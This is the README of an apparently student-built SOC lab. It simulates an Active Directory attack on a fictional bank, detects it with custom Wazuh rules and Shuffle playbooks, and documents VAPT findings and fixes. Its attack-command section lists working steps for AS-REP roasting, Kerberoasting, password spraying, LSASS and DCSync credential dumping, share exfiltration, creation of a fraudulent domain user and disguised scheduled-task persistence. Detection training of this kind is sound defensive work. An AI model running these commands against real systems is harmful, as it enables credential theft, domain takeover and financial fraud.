# 🏦 NexusBank SOC Blue Team Detection Lab

<div align="center">

![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-VMware%20Workstation%20Pro-blue?style=for-the-badge&logo=vmware)
![SIEM](https://img.shields.io/badge/SIEM-Wazuh%204.x-orange?style=for-the-badge)
![SOAR](https://img.shields.io/badge/SOAR-Shuffle-purple?style=for-the-badge)
![Framework](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-red?style=for-the-badge)
![License](https://img.shields.io/badge/License-Educational-yellow?style=for-the-badge)

**A fully contained, evidence-backed SOC lab simulating a targeted attack against a fictional bank, from initial reconnaissance through full domain compromise — with custom detection rules, automated response playbooks, and a complete VAPT report.**

*PGCP-CSF February 2026 · Group 05 · C-DAC Thiruvananthapuram, Kerala*

</div>

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Lab Architecture](#-lab-architecture)
- [Kill Chain](#-kill-chain)
- [Detection Engineering](#-detection-engineering)
- [SOAR Automation](#-soar-automation)
- [MITRE ATT\&CK Coverage](#-mitre-attck-coverage)
- [VAPT Findings Summary](#-vapt-findings-summary)
- [Remediation](#-remediation)
- [Repository Structure](#-repository-structure)
- [Prerequisites](#-prerequisites)
- [Setup Guide](#-setup-guide)
- [Team](#-team)
- [Acknowledgements](#-acknowledgements)

---

## 🔍 Overview

**NexusBank** is a simulated banking environment built entirely inside VMware Workstation Pro using four isolated virtual machines. The lab demonstrates the complete lifecycle of a modern Active Directory intrusion — from unauthenticated reconnaissance to full domain compromise — and proves detection and containment of every attack step.

### What this project covers

| Area | Details |
|---|---|
| **Domain** | BFSI (Banking, Financial Services & Insurance) |
| **Attack surface** | Active Directory, Kerberos, SMB, LSASS, AD Replication |
| **Attack scenarios** | Finance data exfiltration · Payroll ghost-employee fraud |
| **Detection** | 13 custom Wazuh rules, all mapped to MITRE ATT&CK |
| **Response** | 2 Shuffle SOAR playbooks with analyst-in-the-loop approval |
| **AI layer** | Isolation Forest anomaly detection for low-and-slow attacks |
| **Compliance** | NIST CSF 2.0 before/after mapping · RBI CSCRF context |
| **Output** | VAPT report (11 findings, CVSS scored) · 2 IR reports |

---

## 🏗 Lab Architecture

### Network Topology

```
┌─────────────────────────────────────────────────────────────────────┐
│                 VMware VMnet8 NAT — 192.168.10.0/24                 │
│                                                                     │
│  ┌──────────────┐    ┌──────────────┐    ┌────────────────────────┐ │
│  │  NXB-DC01    │    │  NXB-CL01    │    │      NXB-SIEM01        │ │
│  │ 192.168.10.10│    │ 192.168.10.30│    │    192.168.10.50       │ │
│  │              │    │              │    │                        │ │
│  │ Windows      │    │ Windows      │    │  Ubuntu 22.04          │ │
│  │ Server 2022  │◄──►│ 10 Pro       │    │  Wazuh 4.x + Shuffle   │ │
│  │              │    │              │    │                        │ │
│  │ AD DS · DNS  │    │ Domain-joined│    │  SIEM · SOAR           │ │
│  │ GPO · Files  │    │ Sysmon       │    │  Detection Rules       │ │
│  └──────┬───────┘    └──────┬───────┘    └───────────────────────-┘ │
│         │                  │                         ▲              │
│         └──────────────────┴─────────────────────────┘              │
│                                                                     │
│  ┌──────────────┐                                                   │
│  │  NXB-KALI01  │                                                   │
│  │ 192.168.10.40│                                                   │
│  │              │                                                   │
│  │ Kali Linux   │                                                   │
│  │ 2024.x       │                                                   │
│  │ Attack tools │                                                   │
│  └──────────────┘                                                   │
└─────────────────────────────────────────────────────────────────────┘
```

### VM Specifications

| VM | OS | IP | RAM | Role |
|---|---|---|---|---|
| **NXB-DC01** | Windows Server 2022 | 192.168.10.10 | 4 GB | Domain Controller — AD DS, DNS, GPO, File Shares |
| **NXB-CL01** | Windows 10 Pro | 192.168.10.30 | 4 GB | Employee workstation — domain-joined, Sysmon, Wazuh agent |
| **NXB-SIEM01** | Ubuntu 22.04 | 192.168.10.50 | 6 GB | SIEM + SOAR — Wazuh manager + Shuffle |
| **NXB-KALI01** | Kali Linux 2024.x | 192.168.10.40 | 4 GB | Attacker machine — full pentesting toolkit |

### Active Directory Structure

```
NexusBank.internal (Forest/Domain)
├── NXB_Users
│   ├── IT          → arjun.verma  (SPN registered — Kerberoastable!)
│   ├── Finance     → rahul.mehta
│   ├── HR          → priya.sharma
│   └── Interns     → intern.user1 (pre-auth disabled — AS-REP Roastable!)
├── NXB_Computers   → NXB-CL01$
└── NXB_Groups
    ├── GRP_Finance_Staff
    └── GRP_HR_Staff
```

### Deliberate Misconfigurations (VAPT Findings)

| # | Account | Misconfiguration | Attack enabled |
|---|---|---|---|
| 1 | intern.user1 | Kerberos pre-auth disabled | AS-REP Roasting |
| 2 | intern.user1 | Member of Finance group | Share access without job need |
| 3 | intern.user1 | Local admin on CL01 | Lateral movement |
| 4 | arjun.verma | SPN registered on Domain Admin | Kerberoasting → DCSync |
| 5 | Domain-wide | Weak password policy | Brute-force success |

---

## ⚔️ Kill Chain

The attack follows a 9-stage chain executed entirely from NXB-KALI01.

```
Stage 1 — Recon          Stage 2 — AS-REP          Stage 3 — Brute Force
nmap -sC -sV -O          GetNPUsers -no-pass        nxc smb spray
enum4linux-ng            hashcat -m 18200           → Intern@NXB2026 ✓
         │                       │                          │
         └───────────────────────┴──────────────────────────┘
                                 │
                                 ▼
Stage 4 — Lateral Move    Stage 5 — Kerberoast     Stage 6 — Secretsdump
nxc smb /24 → Pwn3d!      GetUserSPNs + hashcat    impacket-secretsdump
CL01 local admin            -m 19700               vs CL01 (LSASS)
                          → ITAdmin@NXB2026 ✓
         │                       │                          │
         └───────────────────────┴──────────────────────────┘
                                 │
                          ┌──────┴──────┐
                          ▼             ▼
                     Attack 1       Attack 2
                  Finance Exfil   Ghost Employee
                  smbclient        evil-winrm
                  ↓ CSV/TXT        net user ghost.employee
              evidence/attack1     → GRP_HR_Staff
                                   → GRP_Finance_Staff

Stage 8 — DCSync                    Stage 9 — Persistence
secretsdump -just-dc-ntlm           schtasks /create
→ ALL domain hashes incl krbtgt     /tn "WindowsUpdateHelper"
→ Full domain compromise            /sc onstart /ru SYSTEM
```

### Key Commands

<details>
<summary><strong>Click to expand — full attack command reference</strong></summary>

```bash
# Environment setup
mkdir -p ~/P1-VAPT/{recon,hashes,post-exploit,evidence/attack1,persistence}

# Stage 1 — Reconnaissance
nmap -sC -sV -O 192.168.10.10 192.168.10.30 192.168.10.50 \
  -oN ~/P1-VAPT/recon/full-scan.txt
enum4linux-ng -A 192.168.10.10 | tee ~/P1-VAPT/recon/enum4linux.txt

# Stage 2 — AS-REP Roasting
impacket-GetNPUsers NexusBank.internal/ \
  -usersfile /usr/share/wordlists/usernames.txt \
  -format hashcat -outputfile ~/P1-VAPT/hashes/asrep.txt \
  -dc-ip 192.168.10.10 -no-pass
hashcat -m 18200 ~/P1-VAPT/hashes/asrep.txt ~/wordlist.txt \
  --force -o ~/P1-VAPT/hashes/asrep-cracked.txt
# → intern.user1 : Intern@NXB2026

# Stage 3 — SMB Brute Force
nxc smb 192.168.10.10 -u intern.user1 -p ~/wordlist.txt \
  | tee ~/P1-VAPT/post-exploit/brute-force.txt

# Stage 4 — Lateral Movement
nxc smb 192.168.10.0/24 -u intern.user1 -p 'Intern@NXB2026' \
  | tee ~/P1-VAPT/post-exploit/lateral.txt
# → NXB-CL01 : Pwn3d!
smbclient //192.168.10.30/C$ \
  -U 'NexusBank.internal/intern.user1%Intern@NXB2026' -c 'ls' \
  | tee ~/P1-VAPT/post-exploit/cl01-c\$.txt

# Stage 5 — Kerberoasting
impacket-GetUserSPNs NexusBank.internal/intern.user1:'Intern@NXB2026' \
  -dc-ip 192.168.10.10 -request \
  -outputfile ~/P1-VAPT/hashes/kerberoast.txt
hashcat -m 19700 ~/P1-VAPT/hashes/kerberoast.txt ~/wordlist.txt \
  --force -o ~/P1-VAPT/hashes/kerberoast-cracked.txt
# → arjun.verma : ITAdmin@NXB2026

# Stage 6 — Secretsdump (LSASS / SAM)
impacket-secretsdump intern.user1:'Intern@NXB2026'@192.168.10.30 \
  2>&1 | tee ~/P1-VAPT/post-exploit/secretsdump-cl01.txt

# Stage 7A — Finance Exfiltration
impacket-smbclient intern.user1:'Intern@NXB2026'@192.168.10.10 << EOF
use Finance
get customer_transactions.csv.txt
get employee_salaries.csv.txt
exit
EOF

# Stage 8 — DCSync
impacket-secretsdump arjun.verma:'ITAdmin@NXB2026'@192.168.10.10 \
  -just-dc-ntlm 2>&1 | tee ~/P1-VAPT/post-exploit/dcsync.txt

# Stage 7B + 9 — Ghost Employee + Persistence
evil-winrm -i 192.168.10.10 -u arjun.verma -p 'ITAdmin@NXB2026' << EOF
net user ghost.employee "Ghost@Fraud2026!" /add /domain /Y
net group GRP_HR_Staff ghost.employee /add /domain
net group GRP_Finance_Staff ghost.employee /add /domain
schtasks /create /tn "WindowsUpdateHelper" \
  /tr "cmd.exe /c echo persistence" /sc onstart /ru SYSTEM /f
exit
EOF
```

</details>

---

## 🔵 Detection Engineering

### Wazuh Custom Rules — `local_rules.xml`

13 custom rules written for the NexusBank kill chain, all mapped to MITRE ATT&CK.

| Rule ID | Level | MITRE | Description | Alerts |
|---|---|---|---|---|
| 100001 | 6 | T1046 | Network scan detected from KALI01 | — |
| 100002 | 10 | T1558.004 | **AS-REP Roasting** — pre-auth disabled account targeted | 4 |
| 100003 | 10 | T1110.001 | **SMB Brute Force** — 6+ failures in 2 min from same IP | 1 |
| 100004 | 12 | T1110.001 | **CRITICAL — Brute Force Succeeded** *(SOAR: PB001)* | 8 |
| 100005 | 10 | T1021.002 | SMB lateral movement — NTLM from KALI01 to CL01 | 3 |
| 100006 | 10 | T1558.003 | **Kerberoasting** — RC4 or AES TGS request | 11 |
| 100007 | 12 | T1003.002 | **CRITICAL — Remote Registry changed** (secretsdump) *(SOAR: PB002)* | 2 |
| 100008 | 12 | T1550.002 | **CRITICAL — Pass-the-Hash / lateral move to DC01** | 6 |
| 100009 | 12 | T1136.002 | **CRITICAL — New privileged AD user created (Ghost Employee)** | 1 |
| 100010 | 15 | T1003.006 | **CRITICAL — DCSync detected** | 28 |
| 100011 | 12 | T1039 | **CRITICAL — Finance share accessed** | 5 |
| 100012 | 13 | T1039 | **CRITICAL — Finance sensitive file downloaded** | 4 |
| 100013 | 12 | T1053.005 | **CRITICAL — Suspicious scheduled task created** (persistence) | — |

### Alert Dashboard Results

```
Total alerts generated:        1,148
Level 12+ (critical) alerts:      54
Authentication failures:           8
Authentication successes:         51
Agents reporting:   NXB-DC01 (primary), NXB-CL01, NXB-SIEM
```

### Detection Stack

- **Wazuh 4.x** — log ingestion, correlation, custom rules, dashboard
- **Sysmon** — deep endpoint telemetry on DC01 and CL01 (Event ID 1 process create, Event ID 10 LSASS access)
- **Windows Audit Policy GPO** — Event IDs 4625 (failed logon), 4662 (AD replication), 4720 (user created), 4768/4769 (Kerberos), 5145 (share access), 7040 (service change)
- **Python scripts** — alert aggregation, brute-force correlation, IOC extraction, Isolation Forest anomaly detection

### AI/ML Anomaly Detection

A scikit-learn **Isolation Forest** model detects low-and-slow attacks that stay under fixed rule thresholds:

```python
# isolation_forest_anomaly.py (excerpt)
from sklearn.ensemble import IsolationForest

model = IsolationForest(contamination=0.05, random_state=42)
model.fit(baseline_features)           # trained on quiet-period traffic
scores = model.decision_function(attack_window_features)
# attack window scores significantly below baseline → flagged
```

---

## 🤖 SOAR Automation

Both playbooks run in **Shuffle** and require analyst approval before any containment action executes.

### PB001 — Brute Force Auto-Disable

```
Rule 100004 fires
      │
      ▼
Webhook trigger (Wazuh → Shuffle)
      │
      ▼
Authenticate to Wazuh API
      │
      ▼
Parse username + source IP from alert
      │
      ▼
──── ANALYST GATE ────  "Disable compromised account?" [Approve / Reject]
      │ Approved
      ▼
PUT /active-response → disable intern.user1 on DC01
      │
      ▼
Verify: Get-ADUser intern.user1 → Enabled: False ✓
```

**Result:** `intern.user1` disabled automatically within seconds of brute-force detection, without human typing a single command.

### PB002 — LSASS Alert Enrichment

```
Rule 100007 fires (Remote Registry → secretsdump likely)
      │
      ▼
Parse process name + agent from alert
      │
      ▼
Query VirusTotal API for process hash
      │
      ▼
──── ANALYST GATE ────  Enriched alert with VT verdict → analyst decides containment
```

---

## 🗺 MITRE ATT&CK Coverage

```
DISCOVERY          CREDENTIAL ACCESS      LATERAL MOVEMENT   PERSISTENCE        COLLECTION
─────────────      ──────────────────     ────────────────   ───────────        ──────────
T1046 ████░ n/a   T1558.004 ████░  4     T1021.002 ███░  3  T1136.002 ██░   1  T1039 ████░ 9
T1087 ░░░░░ GAP   T1110.001 █████  9     T1550.002 ████░  6  T1098    ░░░░ GAP
                   T1558.003 █████  11                        T1053.005 ████ n/a
                   T1003.002 ███░   2
                   T1003.006 ██████ 28 ◄─ HIGHEST VOLUME
```

> **Coverage gaps identified:**
> - `T1087` Account Discovery — LDAP enumeration happened but no dedicated rule
> - `T1098` Account Manipulation — `net group` commands during Ghost Employee, no rule

Full Navigator layer JSON is in `mitre/nexusbank-layer.json`.

---

## 📋 VAPT Findings Summary

| Finding | Severity | CVSS | Technique | Root Cause |
|---|---|---|---|---|
| NXB-001 — LDAP User Enumeration | Medium | 5.3 | T1087 | Anonymous LDAP bind permitted |
| NXB-002 — AS-REP Roasting | High | 7.5 | T1558.004 | Pre-auth disabled on intern.user1 |
| NXB-003 — Weak Password Policy | High | 7.1 | T1110.001 | Domain password policy too permissive |
| NXB-004a — Excess Group Membership | Medium | 6.5 | T1078 | intern.user1 in Finance group |
| NXB-004b — Local Admin Misconfiguration | High | 7.8 | T1078.002 | intern.user1 local admin on CL01 |
| NXB-005 — Credential Dumping (LSASS) | Critical | 9.0 | T1003.002 | No Credential Guard, LSASS unprotected |
| NXB-006 — Kerberoasting | Critical | 8.8 | T1558.003 | SPN on Domain Admin account |
| NXB-007 — Pass-the-Hash | High | 8.1 | T1550.002 | NTLM authentication permitted |
| NXB-008 — Excess Domain Admin | Critical | 9.0 | T1078.002 | arjun.verma unnecessary Domain Admin |
| NXB-009 — Data Exfiltration | Critical | 9.1 | T1039 | Finance share over-permissioned |
| NXB-010 — DCSync / Domain Compromise | Critical | 10.0 | T1003.006 | Domain Admin credential compromised |

---

## 🛡 Remediation

All 11 findings remediated **after** evidence collection (preserving forensic integrity).

| Fix | Action | Closes |
|---|---|---|
| **NXB-002** | Enable Kerberos pre-auth on intern.user1 (ADUC) | AS-REP Roasting |
| **NXB-003** | Fine-Grained Password Policy for Interns (PSO via PowerShell) | Brute force |
| **NXB-004a** | Remove intern.user1 from Finance group | Excess access |
| **NXB-004b** | Remove intern.user1 local admin on CL01 | Lateral movement |
| **NXB-005** | Enable Credential Guard via GPO | LSASS dumping |
| **NXB-006** | Remove SPN from arjun.verma; use gMSA instead | Kerberoasting |
| **NXB-007** | Set NTLM: send NTLMv2 only, refuse LM (GPO) | Weakest hash |
| **NXB-008** | Remove arjun.verma from Domain Admins | Least privilege |
| **NXB-009** | Delete ghost.employee account + group memberships | Fraud account |
| **NXB-010** | Reset krbtgt password **twice** (10-hour gap) | Golden ticket |
| **NXB-011** | Delete WindowsUpdateHelper scheduled task | Persistence |

---

## 📁 Repository Structure

```
nexusbank-soc-lab/
│
├── README.md
│
├── 01_infrastructure/
│   ├── vm-specs.md                  # Hardware/OS specs for each VM
│   ├── network-diagram.png          # Lab topology
│   └── screenshots/                 # 23 build-stage screenshots
│       ├── DC01/
│       ├── CL01/
│       └── SIEM01/
│
├── 02_wazuh/
│   ├── local_rules.xml              # All 13 custom detection rules
│   ├── ossec.conf-snippets/         # client_buffer + integration configs
│   └── screenshots/
│       ├── rules-active.png
│       └── alerts-dashboard.png
│
├── 03_attacks/
│   ├── attack-commands.sh           # Full kill chain command reference
│   ├── wordlist.txt                 # Lab wordlist (9 passwords)
│   └── screenshots/                 # 10 terminal screenshots (01-10)
│
├── 04_alerts/
│   ├── screenshots/                 # Alert-02 through Alert-13 (per rule)
│   ├── dashboard-overview.png
│   └── Wazuh-Report-Final.pdf       # Native Wazuh-generated report
│
├── 05_soar/
│   ├── PB001_BruteForce_AutoDisable.json   # Shuffle workflow export
│   ├── PB002_LSASS_Enrichment.json
│   └── screenshots/
│
├── 06_scripts/
│   ├── alert_aggregator.py
│   ├── bruteforce_detector.py
│   ├── ioc_extractor.py
│   └── isolation_forest_anomaly.py
│
├── 07_vapt/
│   ├── vapt-report.md              # Full 11-finding VAPT report
│   └── cvss-scores.md
│
├── 08_mitre/
│   ├── nexusbank-layer.json         # ATT&CK Navigator layer
│   └── mitre-mapping.md
│
├── 09_remediation/
│   └── remediation-steps.md        # All 11 fixes with evidence
│
└── 10_compliance/
    ├── nist-csf-mapping.md          # Before/after NIST CSF 2.0 mapping
    └── rbi-cscrf-context.md
```

---

## ⚙️ Prerequisites

### Host Machine

| Requirement | Minimum |
|---|---|
| RAM | 20 GB free |
| Storage | 150 GB free |
| CPU | Intel Core i5 / AMD Ryzen 5 (VT-x or AMD-V enabled in BIOS) |
| OS | Windows 10/11, macOS, or Linux |

### Software

| Tool | Version | Download |
|---|---|---|
| VMware Workstation Pro | 17+ | [vmware.com](https://www.vmware.com/products/workstation-pro.html) |
| Windows Server 2022 | Evaluation (180-day) | [Microsoft Evaluation Center](https://www.microsoft.com/en-us/evalcenter/) |
| Windows 10 Pro | Any recent ISO | Microsoft |
| Kali Linux | 2024.x | [kali.org](https://www.kali.org/get-kali/) |
| Ubuntu Desktop | 22.04 LTS | [ubuntu.com](https://ubuntu.com/download/desktop) |

---

## 🚀 Setup Guide

> **⚠️ Important — Legal & ethical notice:** All machines are isolated on a private NAT network. Never direct these tools at systems you do not own or have explicit written authorization to test.

### Phase 1 — Network Setup

1. Open **VMware Workstation Pro → Edit → Virtual Network Editor**
2. Select **VMnet8 (NAT)** and change the subnet to `192.168.10.0` / `255.255.255.0`
3. Disable DHCP on VMnet8 — all four VMs use static IPs

### Phase 2 — Build DC01 (Windows Server 2022)

```powershell
# After OS install and rename to NXB-DC01, set static IP
netsh interface ip set address "Ethernet0" static 192.168.10.10 255.255.255.0 192.168.10.1

# Promote to Domain Controller
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
Install-ADDSForest -DomainName "NexusBank.internal" -DomainNetbiosName "NEXUSBANK" `
  -SafeModeAdministratorPassword (ConvertTo-SecureString "YourSafeModePwd!" -AsPlainText -Force) -Force

# Post-promotion: fix DNS to point to self
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses 192.168.10.10
```

See `01_infrastructure/` for full GPO configuration, OU structure, and user/group creation scripts.

### Phase 3 — Install Wazuh on SIEM01

```bash
# On NXB-SIEM01 (Ubuntu 22.04), after setting static IP 192.168.10.50
curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh
sudo bash wazuh-install.sh -a

# Copy custom rules
sudo cp 02_wazuh/local_rules.xml /var/ossec/etc/rules/local_rules.xml
sudo systemctl restart wazuh-manager
```

### Phase 4 — Deploy Wazuh Agents

```powershell
# On NXB-DC01 and NXB-CL01 (PowerShell as Administrator)
Invoke-WebRequest -Uri "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.x.x-1.msi" `
  -OutFile wazuh-agent.msi
msiexec /i wazuh-agent.msi WAZUH_MANAGER="192.168.10.50" /quiet
NET START WazuhSvc
```

> **One adapter only:** each VM must use **only VMnet8** — adding a second adapter (Host-Only or NAT) breaks Wazuh agent IP attribution; every alert will report `10.0.2.15` instead of the correct IP.

### Phase 5 — Install Sysmon

```powershell
# On DC01 and CL01
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile Sysmon.zip
Expand-Archive Sysmon.zip
.\Sysmon\Sysmon64.exe -accepteula -i sysmon-config.xml
```

### Phase 6 — Configure SOAR (Shuffle)

```bash
# On NXB-SIEM01
git clone https://github.com/Shuffle/Shuffle.git
cd Shuffle && docker-compose up -d
# Access at http://192.168.10.50:3001
# Import workflows from 05_soar/*.json
```

### Pre-Attack Checklist

Before running **any** attack command, verify all six items:

- [ ] DC01 ping from KALI01: `ping 192.168.10.10`
- [ ] CL01 ping from KALI01: `ping 192.168.10.30`
- [ ] SIEM01 ping from KALI01: `ping 192.168.10.50`
- [ ] Wazuh agents NXB-DC01 and NXB-CL01 show **Active** in dashboard
- [ ] Rules 100001–100013 loaded: Wazuh → Rules → search `100001`
- [ ] PreAttack snapshots taken on all four VMs simultaneously

---


## 🙏 Acknowledgements

- [**Wazuh**](https://wazuh.com) — open-source SIEM/XDR platform
- [**Shuffle**](https://shuffler.io) — open-source SOAR automation platform
- [**MITRE ATT&CK**](https://attack.mitre.org) — adversary tactics and techniques knowledge base
- [**Impacket**](https://github.com/fortra/impacket) — Windows protocol attack library (Fortra)
- [**NetExec**](https://github.com/Pennyw0rth/NetExec) — modern credential-testing toolkit
- [**SwiftOnSecurity**](https://github.com/SwiftOnSecurity/sysmon-config) — Sysmon configuration baseline
- [**Sysinternals**](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) (Microsoft) — Sysmon

---


